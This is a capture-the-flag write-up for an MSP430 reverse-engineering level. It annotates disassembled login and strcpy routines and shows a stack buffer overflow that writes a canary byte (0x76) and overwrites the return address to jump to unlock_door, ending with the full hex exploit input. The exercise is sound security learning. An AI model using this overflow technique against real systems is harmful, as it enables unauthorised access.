Once again the main function is wrapped by the login subroutine. In addition the test password is the same and contributes 
absolutely nothing to the security of the program I am trying to break. In addition the character limit for the user input is 
even higher than the previous two levels, so either there is another means of limmiting user input or the new subroutine strcopy 
does something it isn't suppose to. 

452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 7600 1100 mov.b	#0x76, 0x11(sp)
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>

The limit for the user input apperas to be 63 characters.

455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15

regardless of the user input the r15 will hold zero after test password is called thus the four lines may be almost completely 
redundant unless they can be exploited somehow 

4564:  0524           jz	#0x4570 <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	#0x4574 <login+0x48>

similar to the previous level it appeared that my input my overwrite some value present in memory, other pc would fall through to 
line 4580 hit the stop_progExec subroutine and stop the cpu, thus failing the level 

4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 7600 1100 cmp.b	#0x76, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret

The strcpy subroutine copies each byte of my input to the address in r15 prior to the call, however there is a limitation to this 
copying present. The strcopy automatically returns to the calling function if a null byte is encountered. 

4624 <strcpy>
4624:  0d4f           mov	r15, r13
4626:  023c           jmp	#0x462c <strcpy+0x8>
4628:  1e53           inc	r14
462a:  1d53           inc	r13
462c:  6c4e           mov.b	@r14, r12
462e:  cd4c 0000      mov.b	r12, 0x0(r13)
4632:  4c93           tst.b	r12
4634:  f923           jnz	#0x4628 <strcpy+0x4>
4636:  3041           ret

The cmp instruction from login is eventually hit after setting a breakpoint since everything between it and the call to strcpy up 
until this point is useless or unavoidable. The instruction compares the byte 0x76 to that at 0x11(sp). due to the high tolerance 
of input from the getsn paremeter, this address, 0x43fd, can be overwritten. The difference between this and the base address of 
our input is 0x11(17 in decimal) itself since the stack and the base address of my copied input string were the same, i.e. the 
first byte of my input was at 43ec and the SP contained the value 43ec. By maling sure the 17th byte of my input was 0x76 the 
compare statement would successfully jump over the stop_progExec function.   

At this point it is pretty obvious that just like Cuzco the value at the address of SP needs to be overwritten before the return 
instruction in login is executed, which also happens to be the address directly after that which holds 0x76 from my input. by 
making the word after 0x76 in my input 0x4644 the pc will change to the address in memory that calls the unlock door function 
within login. 

Final input:4141414141414141414141414141414141764644    
